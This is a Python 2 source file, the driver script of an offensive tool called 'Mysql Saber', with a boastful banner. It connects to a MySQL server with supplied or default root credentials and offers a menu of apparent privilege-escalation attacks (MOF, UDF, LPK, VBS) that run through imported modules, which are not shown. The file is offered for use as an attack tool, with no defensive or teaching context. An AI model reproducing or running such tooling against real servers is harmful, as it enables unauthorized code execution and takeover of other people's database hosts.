#! /usr/bin/env python
#coding=utf-8
import sys, MySQLdb
from MysqlSaber_col import printWait,printError,printResult

printWait( '''
    #######################################################
    #                                                     #
    #       Mysql Saber v1.1 ===> Yes,Your Highness       #
    #                  BY haxsscker                       #
    #                  team.f4ck.net                      #
    #	                                                  #
    #######################################################
''')
def Sconnect(IP,username,password,database,port):
    try:
        printWait("[+Saber+]===> Try to login... waiting...")
        conn=MySQLdb.connect(host=IP,user=username,passwd=password,db=database,port=port) 
        printWait("[+Saber+]===> OK, let's f4ck the Monster!!!")
    except Exception,e:
        printError(e)
        printError("[+Saber+]===> Hey boy, what's wrong?!Try again or go to levelUP...")
        sys.exit()
        
    try:
        sword = conn.cursor()
        sword.execute('select version();')
        v = sword.fetchall()
    except Exception,e:
        printError(e)
        printError("[+Saber+]===> Hey boy, what's wrong?!Try again or go to levelUP...")
        sys.exit()
    else:        
        printResult("[+Saber+]===> That's the version: "+v[0][0])
    
    return sword
    
def Shelp(IP,username,password,database,port):
    sword = Sconnect(IP,username,password,database,port)
    while 1:
        chioce = '5'
        printWait('''
        [+Saber+]===> Your Highness, I'll be your sword and shield !
                    MOF ----> 1
                    UDF ----> 2
                    LPK ----> 3
                    VBS ----> 4  (ENGLISH PATH ONLY!)
                    SQL ----> 0
                  Please make your chioce!!(press q to exit!!)
        ''')
        while chioce != '1' and chioce != '2' and chioce != '3' and chioce != '0' and chioce != '4' and chioce != 'q':
            chioce = raw_input("chioce?(1/2/3/4/0/q):")
        if chioce == '1':
            import MysqlSaber_mof
            MysqlSaber_mof.Sknight()
            MysqlSaber_mof.main(sword)
        elif chioce == '2':
            import MysqlSaber_udf
            MysqlSaber_udf.Sknight()
            MysqlSaber_udf.main(sword)            
        elif chioce == '3':
            import MysqlSaber_lpk
            MysqlSaber_lpk.Sknight()
            MysqlSaber_lpk.main(sword)   
        elif chioce == '4':
            import MysqlSaber_vbs
            MysqlSaber_vbs.Sknight()
            MysqlSaber_vbs.main(sword)             
        elif chioce == '0':
            import MysqlSaber_sql
            MysqlSaber_sql.Sknight()
            MysqlSaber_sql.main(sword)            
        elif chioce == 'q':
            sword.close()
            sys.exit()       
        else:
            printError("[+Saber+]===> Sorry, I can not understand..")
            sword.close()
            sys.exit()

def main():
    Susername='root'
    Spassword=''
    Sdatabase='mysql'
    SIP = 'localhost'
    Sport = 3306
    IP = raw_input("IP ?(localhost):")
    port = raw_input("Port ?(3306):")
    username = raw_input("username?(root):")
    password = raw_input("password?(''):")
    database = raw_input("database?(mysql):")
    if not username:
        username = Susername
    if not password:
        password = Spassword
    if not database:
        database = Sdatabase
    if not IP:
        IP = SIP
    if not port:
        port = Sport
    else:
        port = int(port)
    Shelp(IP,username,password,database,port)    

if __name__ == "__main__":
    main()